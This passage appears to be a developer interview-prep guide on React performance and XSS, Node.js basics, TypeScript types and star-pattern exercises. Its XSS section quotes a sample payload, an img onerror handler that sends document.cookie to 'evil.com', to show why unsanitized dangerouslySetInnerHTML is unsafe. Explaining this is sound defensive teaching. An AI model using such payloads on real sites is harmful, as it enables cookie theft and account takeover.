      () => products.filter(p => p.name.includes(search)),
      [products, search]
    );
    ```

    - **Debounce/throttle** — limit how often an expensive handler fires.

    ```jsx
    const debouncedSearch = useMemo(() => debounce((q) => fetchResults(q), 400), []);
    <input onChange={e => debouncedSearch(e.target.value)} />
    ```

    - **`React.lazy` + `Suspense`** — split code into chunks, load only when needed.

    ```jsx
    const Settings = lazy(() => import("./Settings"));
    <Suspense fallback={<Spinner />}><Settings /></Suspense>
    ```

1. Avoid inline functions and objects in JSX
    - Every time a component renders, a new function or object literal is created in memory. When passed as props to a child wrapped in `React.memo`, it breaks memoization — the child always sees a "new" prop.

    ```jsx
    // ❌ New function reference on every render → React.memo on Child is useless
    <Child onClick={() => handleClick(id)} />
    <Child style={{ color: "red" }} />

    // ✅ Stable references — memoize them
    const handleChildClick = useCallback(() => handleClick(id), [id]);
    const childStyle = useMemo(() => ({ color: "red" }), []);

    <Child onClick={handleChildClick} />
    <Child style={childStyle} />
    ```

    - **Exception:** If the child is NOT wrapped in `React.memo`, inline functions are fine — the extra object allocation is negligible.
    - **Keep JSX readable:** If JSX grows large, extract sections into named sub-components rather than adding layers of logic inline.

    ```jsx
    // ❌ Deeply nested conditional logic in JSX
    return (
      <div>
        {isLoading ? <Spinner /> : error ? <ErrorMsg msg={error} /> : data.map(d => <Item key={d.id} {...d} />)}
      </div>
    );

    // ✅ Extracted — easy to read
    const Content = () => {
      if (isLoading) return <Spinner />;
      if (error) return <ErrorMsg msg={error} />;
      return data.map(d => <Item key={d.id} {...d} />);
    };
    return <div><Content /></div>;
    ```

1. XSS (Cross-Site Scripting) in React — what it is and how to prevent it
    - **XSS** is an attack where a hacker injects malicious JavaScript into your app. When other users load the page, the script runs in their browser — stealing cookies, tokens, or performing actions on their behalf.

    **How a hacker injects values:**
    - Via URL params: `https://app.com?name=<script>stealCookies()</script>`
    - Via form inputs or API responses that contain HTML/JS strings
    - If you render these directly as HTML, the browser executes the script

    ```jsx
    // ❌ Dangerous — renders user input as raw HTML
    const Comment = ({ content }) => (
      <div dangerouslySetInnerHTML={{ __html: content }} />
    );
    // If content = '<img src=x onerror="fetch(`evil.com?c=${document.cookie}`)">'
    // → browser executes the onerror handler → cookies stolen

    // ✅ Safe — React escapes by default
    const Comment = ({ content }) => <div>{content}</div>;
    // '<script>...' is rendered as plain text — browser never executes it

    // ✅ If you MUST render HTML — sanitize first
    import DOMPurify from "dompurify";
    const SafeComment = ({ html }) => (
      <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />
    );
    ```

    - React's `{}` JSX expressions **automatically escape** HTML — `<`, `>`, `&`, `"` become safe text entities.
    - Only `dangerouslySetInnerHTML` bypasses this — treat it like `eval()` and always sanitize the input.

1. React Do's and Don'ts

    | ✅ Do | ❌ Don't |
    | --- | --- |
    | Keep components small and focused (SRP) | Write one component that does everything |
    | Use `useState` for local UI state | Mutate state directly (`state.x = 1`) |
    | Spread to update objects/arrays (`{...obj}`) | Push/splice/mutate existing arrays or objects |
    | Declare all `useEffect` dependencies | Leave out deps to "avoid re-runs" (stale closure bugs) |
    | Return cleanup from `useEffect` for listeners/timers | Leave event listeners attached after unmount (memory leaks) |
    | Use `key` with unique IDs in lists | Use array index as `key` for dynamic/reordered lists |
    | Extract repeated logic into custom hooks | Duplicate `useEffect` + `useState` logic across components |
    | Use `React.memo` + `useCallback` when profiling shows re-render issues | Wrap everything in `memo`/`useCallback` prematurely |
    | Use `React.lazy` + `Suspense` to split large routes | Import everything at the top — bloats initial bundle |
    | Sanitize HTML before `dangerouslySetInnerHTML` | Trust user input or API strings as safe HTML |
    | Use `useCallback` for handlers passed to memoized children | Create inline arrow functions inside JSX for performance-sensitive components |
    | Use `ErrorBoundary` around route-level components | Let one broken component crash the whole app |
    | Use `Context` or state management for shared data | Prop-drill more than 2–3 levels deep |

---

## 🟣 Node.js

1. What is the Node.js Runtime?
   - Node.js is single-threaded in the sense that JavaScript execution happens on one thread, but it is multi-threaded under the hood because Libuv manages a thread pool for heavy I/O. This design makes it perfect for I/O-intensive apps (streaming, APIs) but a poor choice for CPU-intensive tasks (image processing, heavy encryption) because those would block the main thread.

   <img width="1434" height="718" alt="image" src="https://github.com/user-attachments/assets/cc9fe34c-3d53-47e7-b8d2-5a2b7c8073e3" />

1. What is REPL in Node?
   - An interactive shell that cycles through four steps:
     - **Read:** Reads the user's input, parses it into a JavaScript data structure, and stores it in memory.
     - **Eval:** Takes the data structure and evaluates the code.
     - **Print:** Prints the result of the evaluation to the console.
     - **Loop:** Loops the entire process until the user terminates the session.

1. What is the difference between PUT and PATCH?
   - Both are HTTP methods used to update a resource, but they differ in **how much** of the resource they replace.
   - **PUT** replaces the **entire** resource with the request body. Fields omitted from the body are removed/reset.
   - **PATCH** applies a **partial** update — only the fields sent in the request body are changed; everything else stays as-is.

   | Feature | PUT | PATCH |
   |---------|-----|-------|
   | Scope | Full replacement | Partial update |
   | Idempotent | ✅ Yes | ✅ Usually yes |
   | Body required | All fields | Only changed fields |
   | Use case | Overwrite entire record | Update one or a few fields |

   ```js
   // Resource: { id: 1, name: "Alice", age: 30, city: "Delhi" }

   // PUT /users/1  → replaces the whole object
   // Body: { name: "Alice", age: 31 }
   // Result: { id: 1, name: "Alice", age: 31 }  ← city is GONE

   // PATCH /users/1  → merges only sent fields
   // Body: { age: 31 }
   // Result: { id: 1, name: "Alice", age: 31, city: "Delhi" }  ← city preserved
   ```

   > **Rule of thumb:** Use **PUT** when you control the full object; use **PATCH** when updating a single field like a status, toggle, or counter.

---

## 🔷 TypeScript

1. What is TypeScript and why use it?
   - TypeScript is a **statically typed superset of JavaScript** developed by Microsoft. It adds optional types, interfaces, generics, and other features to JS, then compiles down to plain JavaScript.
   - All valid JavaScript is valid TypeScript — you opt into strictness gradually.

   | Feature | JavaScript | TypeScript |
   | --- | --- | --- |
   | Type checking | At runtime | At compile time |
   | Errors caught | When code runs | Before code ships |
   | IDE support | Basic | Rich autocomplete, refactoring |
   | Readability | Implicit types | Self-documenting types |

   ```ts
   // JavaScript — error only at runtime
   function add(a, b) { return a + b; }
   add("5", 3); // "53" — silent bug

   // TypeScript — error caught at compile time
   function add(a: number, b: number): number { return a + b; }
   add("5", 3); // ❌ Error: Argument of type 'string' is not assignable to parameter of type 'number'
   ```

1. What is type inference in TypeScript?
   - TypeScript can **automatically determine the type** of a variable from its initial value — you don't always need to annotate explicitly.

   ```ts
   let name = "Mohamed";   // inferred as string
   let age  = 25;           // inferred as number
   let flag = true;         // inferred as boolean

   name = 42;  // ❌ Error: Type 'number' is not assignable to type 'string'

   // Inference in functions
   const add = (a: number, b: number) => a + b;
   // return type inferred as number — no annotation needed

   // When to annotate explicitly:
   let result: string | null = null; // needed — can't infer union from null alone
   ```

1. What are the data types in TypeScript?

   **Primitive types:**

   | Type | Description | Example |
   | --- | --- | --- |
   | `string` | Text values | `"hello"` |
   | `number` | All numbers (int + float) | `42`, `3.14` |
   | `boolean` | True/false | `true`, `false` |
   | `null` | Intentional absence of value | `null` |
   | `undefined` | Variable declared but not assigned | `undefined` |
   | `symbol` | Unique identifier | `Symbol("id")` |
   | `bigint` | Large integers | `9007199254740991n` |

   **Special types:**

   | Type | Description |
   | --- | --- |
   | `any` | Disables type checking — escape hatch |
   | `unknown` | Type-safe `any` — must narrow before use |
   | `never` | Value that can never occur |
   | `void` | Function returns nothing |

   **Object types:**

   ```ts
   // Array
   const nums: number[] = [1, 2, 3];
   const strs: Array<string> = ["a", "b"];

   // Tuple — fixed length, fixed types
   const pair: [string, number] = ["age", 25];

   // Enum
   enum Direction { Up, Down, Left, Right }
   const dir: Direction = Direction.Up; // 0

   // Object
   const user: { name: string; age: number } = { name: "Mohamed", age: 25 };
   ```

1. What is the difference between `any`, `unknown`, and `never`?

   | | `any` | `unknown` | `never` |
   | --- | --- | --- | --- |
   | Type checking | ❌ Disabled entirely | ✅ Must narrow before use | N/A — value never exists |
   | Assignable to anything | ✅ Yes | ❌ No | ✅ Yes (it's the bottom type) |
   | Anything assignable to it | ✅ Yes | ✅ Yes | ❌ No |
   | Use case | Migrating JS → TS, quick escape hatch | Safer APIs, user input | Impossible branches, functions that never return |

   ```ts
   // any — no safety
   let a: any = "hello";
   a.toFixed();  // no TS error, crashes at runtime

   // unknown — must narrow first
   let u: unknown = "hello";
   u.toUpperCase();  // ❌ Error
   if (typeof u === "string") {
     u.toUpperCase();  // ✅ OK — type narrowed to string
   }

   // never — function that never returns normally
   function fail(msg: string): never {
     throw new Error(msg);  // always throws — control never leaves this function
   }

   function infinite(): never {
     while (true) {}  // never returns
   }
   ```

1. What is the difference between `type` and `interface`?

   | Feature | `type` | `interface` |
   | --- | --- | --- |
   | Object shapes | ✅ Yes | ✅ Yes |
   | Primitives / unions | ✅ Yes (`type ID = string \| number`) | ❌ No |
   | Extend / inherit | `&` (intersection) | `extends` keyword |
   | Declaration merging | ❌ No — re-declaring is an error | ✅ Yes — same name merges |
   | Computed properties | ✅ Yes | ❌ No |

   ```ts
   // interface — best for object shapes and public APIs
   interface User {
     name: string;
     age: number;
   }
   interface User {
     email: string; // ✅ Merges with the first — final User has all 3 fields
   }

   // type — best for unions, intersections, primitives
   type ID = string | number;
   type Point = { x: number } & { y: number }; // intersection = both shapes
   type Status = "active" | "inactive" | "banned";

   // Both support extending
   interface Admin extends User { role: string; }
   type Admin = User & { role: string };
   ```

   - **Rule of thumb:** Use `interface` for class/object shapes. Use `type` for everything else (unions, tuples, mapped types).

1. What are generics in TypeScript?
   - Generics let you write **reusable code that works with different types** while keeping full type safety. Think of `<T>` as a type placeholder that gets filled in when the function/class is used.

   ```ts
   // Without generics — must pick one type or use any (loses safety)
   function identity(value: any): any { return value; }

   // With generics — type-safe AND reusable
   function identity<T>(value: T): T { return value; }

   identity<string>("hello");  // T = string
   identity<number>(42);        // T = number
   identity("world");           // T inferred as string
   ```

   ```ts
   // Generic with constraint — T must have a length property
   function getLength<T extends { length: number }>(arg: T): number {
     return arg.length;
   }
   getLength("hello");    // 5
   getLength([1, 2, 3]);  // 3
   getLength(42);         // ❌ Error: number has no length

   // Generic interface — reusable API response shape
   interface ApiResponse<T> {
     data: T;
     status: number;
     message: string;
   }
   const usersRes: ApiResponse<User[]> = { data: [], status: 200, message: "OK" };
   const postRes: ApiResponse<Post>   = { data: post, status: 200, message: "OK" };

   // Generic with multiple types
   function pair<K, V>(key: K, value: V): [K, V] {
     return [key, value];
   }
   const p = pair("name", "Mohamed"); // [string, string]
   ```

1. What are optional properties, optional chaining, and nullish coalescing?
   - **Optional property (`?`)** — marks an object field as `type | undefined`.
   - **Optional chaining (`?.`)** — safely accesses nested properties; returns `undefined` instead of throwing if the chain is `null`/`undefined`.
   - **Non-null assertion (`!`)** — tells TypeScript "I guarantee this is not null/undefined" (use sparingly).
   - **Nullish coalescing (`??`)** — returns the right side only when the left is `null` or `undefined` (not for `0` or `""`).

   ```ts
   interface User {
     name: string;
     age?: number;          // optional — string | undefined
     address?: {
       city?: string;
     };
   }

   const user: User = { name: "Mohamed" };

   // Optional chaining — no crash if address or city is undefined
   console.log(user.address?.city);        // undefined (no throw)
   console.log(user.address?.city?.toUpperCase()); // undefined

   // Non-null assertion — use only when you're certain
   const input = document.getElementById("name") as HTMLInputElement;
   console.log(input!.value);              // tells TS: trust me, not null

   // Nullish coalescing
   const age = user.age ?? 18;             // 18 only if age is null/undefined
   const label = user.name ?? "Anonymous"; // "Mohamed" — name exists

   // vs || (OR) — also triggers on 0 and ""
   const count = 0;
   console.log(count || 10);  // 10 — wrong! 0 is falsy
   console.log(count ?? 10);  // 0  — correct! 0 is not null/undefined
   ```

1. What is the `never` type and when is it used?
   - `never` represents a **value that can never occur**. It is the **bottom type** — assignable to every type, but nothing is assignable to `never`.

   **Case 1 — Function that always throws:**
   ```ts
   function throwError(msg: string): never {
     throw new Error(msg); // always throws, never returns normally
   }
   ```

   **Case 2 — Function that never terminates:**
   ```ts
   function runForever(): never {
     while (true) { /* infinite loop */ }
   }
   ```

   **Case 3 — After narrowing, no type remains:**
   ```ts
   function process(value: string | number) {
     if (typeof value === "string") {
       value; // string
     } else if (typeof value === "number") {
       value; // number
     } else {
       value; // never — all cases handled, nothing is left
     }
   }
   ```

   ```ts
   // ⚠️ Note — a void function is NOT never
   const fn = (): void => {
     console.log(5); // returns undefined — control does leave the function
   };
   // never means control NEVER leaves normally (always throws or loops forever)
   ```

1. What is the exhaustive check pattern with `never`?
   - Assign the leftover value to `never` in a `switch` default case. If you add a new variant to the union but forget to handle it, TypeScript gives a **compile-time error** — catching the bug before runtime.

   ```ts
   type Shape = "circle" | "square" | "triangle";

   function getArea(shape: Shape): number {
     switch (shape) {
       case "circle":   return 1;
       case "square":   return 2;
       case "triangle": return 3;
       default:
         const _exhaustive: never = shape;
         // ❌ Compile error if any case above is missing
         return _exhaustive;
     }
   }
   ```

   - Yes — **the `default` branch can never be reached at runtime** when all cases are handled. That's exactly the point: TypeScript ensures at compile time that every variant of `Shape` has a `case`, so nothing ever falls through to `default`.
   - If you add `"rectangle"` to `Shape` without adding `case "rectangle":`, TypeScript immediately errors on `const _exhaustive: never = shape` because `shape` would be `"rectangle"` there — which is not assignable to `never`.

   ```ts
   // Adding a new shape — TS forces you to handle it
   type Shape = "circle" | "square" | "triangle" | "rectangle"; // added

   function getArea(shape: Shape): number {
     switch (shape) {
       case "circle":   return 1;
       case "square":   return 2;
       case "triangle": return 3;
       // ❌ TS Error: Type '"rectangle"' is not assignable to type 'never'
       // → you MUST add case "rectangle": before this compiles
       default:
         const _exhaustive: never = shape;
         return _exhaustive;
     }
   }
   ```

---

## 🔺 Pattern Based Questions

1. Print a triangle and an inverted triangle using `*`.

   **Triangle (left-aligned)**
   ```
   *
   **
   ***
   ****
   *****
   ```
   ```js
   function triangle(n) {
     for (let i = 1; i <= n; i++) {
       console.log('*'.repeat(i));
     }
   }
   triangle(5);
   ```

   **Inverted Triangle (left-aligned)**
   ```
   *****
   ****
   ***
   **
   *
   ```
   ```js
   function invertedTriangle(n) {
     for (let i = n; i >= 1; i--) {
       console.log('*'.repeat(i));
     }
   }
   invertedTriangle(5);
   ```

   **Centered Triangle (pyramid)**
   ```
       *
      ***
     *****
    *******
   *********
   ```
   ```js
   function pyramid(n) {
     for (let i = 1; i <= n; i++) {
       const spaces = ' '.repeat(n - i);
       const stars  = '*'.repeat(2 * i - 1);
       console.log(spaces + stars);
     }
   }
   pyramid(5);
   ```

   **Centered Inverted Pyramid**
   ```
   *********
    *******
     *****
      ***
       *
   ```
   ```js
   function invertedPyramid(n) {
     for (let i = n; i >= 1; i--) {
       const spaces = ' '.repeat(n - i);
       const stars  = '*'.repeat(2 * i - 1);
       console.log(spaces + stars);
     }
   }
   invertedPyramid(5);
   ```
